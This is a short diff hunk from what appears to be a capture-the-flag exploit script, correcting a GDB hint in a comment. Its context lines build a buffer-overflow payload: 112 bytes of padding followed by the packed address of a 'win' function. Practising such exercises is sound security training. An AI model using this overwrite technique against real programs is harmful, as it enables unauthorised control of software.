@@ -16,7 +16,7 @@ s = r.recvuntil('Give me a string: ')
 
 n = 112
 
-win_function = p32(0x804863d) # run 'p32 win' in GDB
+win_function = p32(0x804863d) # run 'p win' in GDB
 
 payload = b'A' * n + win_function
 
